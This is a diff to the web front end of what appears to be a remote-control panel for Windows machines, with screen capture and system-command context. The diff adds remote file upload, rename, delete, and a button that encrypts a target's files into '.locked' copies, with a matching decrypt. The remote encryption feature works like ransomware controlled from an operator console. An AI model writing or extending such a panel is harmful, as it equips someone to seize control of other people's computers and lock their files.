@@ -72,6 +72,13 @@ body::before{content:'';position:fixed;top:-50%;left:-50%;width:200%;height:200%
 .files .entry.dir .nm{color:#f0f4fc}
 .files .entry .sz{color:rgba(255,255,255,.2);font-size:.7rem;white-space:nowrap;min-width:4.5rem;text-align:right}
 .files .entry .dt{color:rgba(255,255,255,.2);font-size:.7rem;white-space:nowrap;min-width:7.5rem;text-align:right}
+.files .entry .acts{display:flex;gap:2px;flex-shrink:0;opacity:0;transition:opacity .15s;margin-left:4px}
+.files .entry:hover .acts{opacity:1}
+.btn-xs{padding:2px 5px;font-size:.62rem;border-radius:4px;line-height:1;background:rgba(255,255,255,.05);border:1px solid rgba(255,255,255,.06);color:rgba(255,255,255,.5);cursor:pointer;transition:all .15s;font-family:inherit}
+.btn-xs:hover{background:rgba(255,255,255,.1);color:#e8edf5}
+.drop-zone{border:2px dashed rgba(255,255,255,.08);border-radius:10px;padding:.5rem .8rem;text-align:center;font-size:.75rem;color:rgba(255,255,255,.25);margin-bottom:.6rem;transition:all .2s;cursor:pointer;position:relative}
+.drop-zone.drag-over{border-color:#818cf8;background:rgba(129,140,248,.06);color:#818cf8}
+.files .entry .nm{cursor:default}.files .entry.dir .nm{cursor:pointer}.files .entry.dir .nm:hover{color:#818cf8}
 select.mon{background:rgba(0,0,0,.3);color:#e8edf5;border:1px solid rgba(255,255,255,.08);border-radius:8px;padding:.35rem .55rem;font-size:.8rem;outline:none;cursor:pointer;font-family:inherit}
 select.mon:focus{border-color:rgba(88,100,255,.4)}
 .capture-bar{display:flex;gap:.5rem;margin-bottom:.8rem;align-items:center;flex-wrap:wrap}
@@ -235,6 +242,10 @@ select.mon:focus{border-color:rgba(88,100,255,.4)}
   </div>
 
   <div class="panel" id="panel-files">
+    <div class="drop-zone" id="dropZone" ondragover="event.preventDefault();this.classList.add('drag-over')" ondragleave="this.classList.remove('drag-over')" ondrop="handleDrop(event)">
+      <span>Drop files here or <a onclick="document.getElementById('filePicker').click()" style="color:#818cf8;cursor:pointer;text-decoration:underline">browse</a></span>
+      <input type="file" id="filePicker" multiple style="display:none" onchange="handleFilePick(this)">
+    </div>
     <div class="files" id="filesBrowser">
       <div class="loading">Click a directory to browse</div>
     </div>
@@ -418,13 +429,77 @@ function renderFiles(json){
  entries.forEach(e=>{
   const nm=e.n||'?';const isDir=e.d===true||e.d==='true';const sz=e.s||0;const dt=e.m||'';
   const szStr=sz<1024?sz+' B':sz<1048576?(sz/1024).toFixed(1)+' KB':(sz/1048576).toFixed(1)+' MB';
-  html+='<div class="entry'+(isDir?' dir':'')+'" onclick="'+(isDir?"browseDir('"+uenc(filePath+nm+'\\')+"')":'')+'">';
-  html+='<div class="ico '+(isDir?'folder':'file')+'">'+(isDir?'📁':'📄')+'</div>';
-  html+='<div class="nm">'+esc(nm)+'</div>';
+  const fp=filePath+nm;
+  html+='<div class="entry'+(isDir?' dir':'')+'">';
+  html+='<div class="ico '+(isDir?'folder':'file')+'" onclick="'+(isDir?"browseDir('"+uenc(fp+'\\')+"')":'')+'">'+(isDir?'📁':'📄')+'</div>';
+  html+='<div class="nm" onclick="'+(isDir?"browseDir('"+uenc(fp+'\\')+"')":'')+'">'+esc(nm)+'</div>';
   html+=isDir?'<div class="sz"></div>':'<div class="sz">'+szStr+'</div>';
-  html+='<div class="dt">'+esc(dt)+'</div></div>';
+  html+='<div class="dt">'+esc(dt)+'</div>';
+  if(!isDir){
+   html+='<div class="acts">';
+   html+='<button class="btn btn-ghost btn-xs" onclick="fileRename(\''+escAttr(nm)+'\')" title="Rename">✏️</button>';
+   html+='<button class="btn btn-ghost btn-xs" onclick="fileDeleteOp(\''+escAttr(fp)+'\')" title="Delete">🗑️</button>';
+   html+='<button class="btn btn-ghost btn-xs" onclick="fileEncryptOp(\''+escAttr(fp)+'\')" title="Encrypt">🔒</button>';
+   if(nm.endsWith('.locked'))html+='<button class="btn btn-ghost btn-xs" onclick="fileDecryptOp(\''+escAttr(fp)+'\')" title="Decrypt">🔓</button>';
+   html+='</div>';
+  }else{
+   html+='<div class="acts"><button class="btn btn-ghost btn-xs" onclick="fileRename(\''+escAttr(nm)+'\')" title="Rename">✏️</button>';
+   html+='<button class="btn btn-ghost btn-xs" onclick="fileDeleteOp(\''+escAttr(fp)+'\')" title="Delete">🗑️</button></div>';
+  }
+  html+='</div>';
  });
  el.innerHTML=html;
+}
+
+async function fileDeleteOp(path){
+ if(!confirm('Delete "'+path.split('\\').pop()+'"?'))return;
+ const el=document.getElementById('filesBrowser');const errEl=document.getElementById('filesErr');
+ errEl.style.display='none';el.innerHTML='<div class="loading">Deleting...</div>';
+ const res=await sendAndWait('file_delete',path,el,'filesErr');
+ if(res)refreshFiles();
+}
+async function fileRename(name){
+ const newName=prompt('New name:',name);if(!newName||newName===name)return;
+ const path=filePath+name;
+ const el=document.getElementById('filesBrowser');const errEl=document.getElementById('filesErr');
+ errEl.style.display='none';el.innerHTML='<div class="loading">Renaming...</div>';
+ const res=await sendAndWait('file_rename',JSON.stringify({path,name:newName}),el,'filesErr');
+ if(res)refreshFiles();
+}
+async function fileEncryptOp(path){
+ if(!confirm('Encrypt "'+path.split('\\').pop()+'"? This will replace the file with a .locked version.'))return;
+ const el=document.getElementById('filesBrowser');const errEl=document.getElementById('filesErr');
+ errEl.style.display='none';el.innerHTML='<div class="loading">Encrypting...</div>';
+ const res=await sendAndWait('file_encrypt',path,el,'filesErr');
+ if(res)refreshFiles();
+}
+async function fileDecryptOp(path){
+ if(!confirm('Decrypt "'+path.split('\\').pop()+'"? This will restore the original file.'))return;
+ const el=document.getElementById('filesBrowser');const errEl=document.getElementById('filesErr');
+ errEl.style.display='none';el.innerHTML='<div class="loading">Decrypting...</div>';
+ const res=await sendAndWait('file_decrypt',path,el,'filesErr');
+ if(res)refreshFiles();
+}
+function refreshFiles(){if(filePath)browseDir(filePath);else browseDir('');}
+async function uploadFile(file){
+ const path=filePath+file.name;
+ const reader=new FileReader();
+ reader.onload=async function(e){
+  const base64=e.target.result.split(',')[1];
+  const el=document.getElementById('filesBrowser');const errEl=document.getElementById('filesErr');
+  errEl.style.display='none';el.innerHTML='<div class="loading">Uploading '+esc(file.name)+'...</div>';
+  const res=await sendAndWait('file_upload',JSON.stringify({path,data:base64}),el,'filesErr');
+  if(res)refreshFiles();
+ };
+ reader.readAsDataURL(file);
+}
+function handleDrop(e){
+ e.preventDefault();document.getElementById('dropZone').classList.remove('drag-over');
+ for(let f of e.dataTransfer.files)uploadFile(f);
+}
+function handleFilePick(input){
+ for(let f of input.files)uploadFile(f);
+ input.value='';
 }
 
 async function sendSystemCmd(type){
